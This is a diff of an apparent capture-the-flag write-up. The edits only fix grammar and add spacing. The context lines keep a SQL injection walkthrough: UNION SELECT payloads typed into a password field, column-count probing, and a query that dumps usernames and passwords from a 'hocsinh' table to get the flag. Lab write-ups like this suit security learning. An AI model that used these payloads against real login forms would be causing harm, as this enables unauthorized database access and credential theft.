@@ -16,7 +16,7 @@ I use **'OR+1+UNION+SELECT+null,null,null,null,null#** after password.
 
 ![image](https://user-images.githubusercontent.com/71617433/137172060-1398ebb1-e718-49d7-a85c-6aab7102c609.png)
 
-It don’t work, so let try 6,7,8 and more until it works. And when I use 7 null colums, it works.
+It doesn’t work, so let try 6,7,8 and more until it works. And when I use 7 null colums, it works.
 
 ![image](https://user-images.githubusercontent.com/71617433/137172111-77d7dfc7-f652-4acc-8d9d-cbf0843eb5b2.png)
 
@@ -50,6 +50,8 @@ Sql command:
 **'OR+1+UNION+SELECT+null,user,null,null,password,null,null+FROM+hocsinh#**
 
 ![image](https://user-images.githubusercontent.com/71617433/137172838-c50e4529-dbde-4057-9c1b-802618aa058d.png)
+
+
  
 
 We can see the flag at the last row :
